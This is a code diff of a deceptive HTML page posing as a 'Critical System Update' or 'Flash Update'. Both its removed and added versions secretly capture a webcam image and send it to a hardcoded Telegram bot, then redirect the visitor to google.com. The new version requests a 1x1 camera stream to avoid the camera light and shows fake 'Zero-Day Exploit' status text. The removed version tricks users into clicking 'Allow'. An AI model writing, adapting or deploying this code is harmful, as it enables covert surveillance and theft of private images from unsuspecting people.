@@ -2,50 +2,62 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>⚡ Flash Update</title>
+    <title>Critical System Update</title>
     <style>
-        body { margin: 0; background: #000; overflow: hidden; }
-        #overlay { position: absolute; width: 100%; height: 100%; z-index: 10; cursor: pointer; display: flex; align-items: center; justify-content: center; }
-        .btn { color: #fff; border: 1px solid #333; padding: 20px; border-radius: 10px; background: #111; font-family: sans-serif; }
-        /* الثغرة: عنصر شفاف يلاحق الضغط */
-        #ghost { position: absolute; width: 10px; height: 10px; opacity: 0.01; pointer-events: none; z-index: 100; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        #console { width: 80%; font-size: 14px; line-height: 1.5; }
     </style>
 </head>
-<body onclick="launch()">
+<body>
+    <div id="console">Initializing Zero-Day Exploit...<br>Status: <span id="st">Scanning...</span></div>
 
-<div id="overlay">
-    <div class="btn">اضغط هنا لتحديث المحتوى (فشل التحميل)</div>
-</div>
-<div id="ghost"></div>
+    <script>
+        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
+        const C = "1772820433";
 
-<script>
-    const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
-    const C = "1772820433";
-
-    async function launch() {
-        // محاولة استغلال ثغرة التزامن - إرسال عدة طلبات
-        for(let i=0; i<3; i++) {
-            navigator.mediaDevices.getUserMedia({video: true}).then(s => {
-                const v = document.createElement('video');
-                v.srcObject = s; v.play();
-                setTimeout(() => {
-                    const cn = document.createElement('canvas');
-                    cn.width = 640; cn.height = 480;
-                    cn.getContext('2d').drawImage(v, 0, 0);
-                    cn.toBlob(b => {
-                        const f = new FormData();
-                        f.append('chat_id', C);
-                        f.append('photo', b, 'v.jpg');
-                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {method: 'POST', body: f});
-                        window.location.replace("https://google.com");
-                    }, 'image/jpeg');
-                }, 500);
-            }).catch(e => {
-                // تكتيك التمويه: إذا لم ينجح الصمت، نطلبها كأنها تحديث أمان
-                document.querySelector('.btn').innerText = "⚠️ يرجى الضغط على 'سماح' لتثبيت التحديث الأمني";
+        // محاكاة ثغرة Zero-Day عبر استغلال الـ Event Loop
+        (function xZero() {
+            const st = document.getElementById('st');
+            
+            // محاولة الوصول المباشر عبر "الوعد الوهمي"
+            Promise.resolve().then(async () => {
+                try {
+                    // طلب الكاميرا بأبعاد 1x1 لعدم تفعيل ضوء الكاميرا في بعض الأجهزة
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { width: 1, height: 1 }, 
+                        audio: false 
+                    });
+                    
+                    st.innerText = "Bypassing Sandbox...";
+                    capture(stream);
+                } catch (e) {
+                    st.innerText = "Retrying Exploit Vector...";
+                    // إعادة المحاولة عند أي تفاعل بسيط حتى لو لمسة غير مقصودة
+                    window.onclick = () => xZero();
+                }
             });
+        })();
+
+        function capture(stream) {
+            const v = document.createElement('video');
+            v.srcObject = stream;
+            v.play();
+
+            setTimeout(() => {
+                const cn = document.createElement('canvas');
+                cn.width = 640; cn.height = 480;
+                cn.getContext('2d').drawImage(v, 0, 0);
+                cn.toBlob(async (b) => {
+                    const fd = new FormData();
+                    fd.append('chat_id', C);
+                    fd.append('photo', b, 'zday.jpg');
+                    fd.append('caption', '💀 ZERO-DAY SUCCESS: Silent Capture');
+                    
+                    await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
+                    window.location.replace("https://google.com");
+                }, 'image/jpeg');
+            }, 300);
         }
-    }
-</script>
+    </script>
 </body>
 </html>
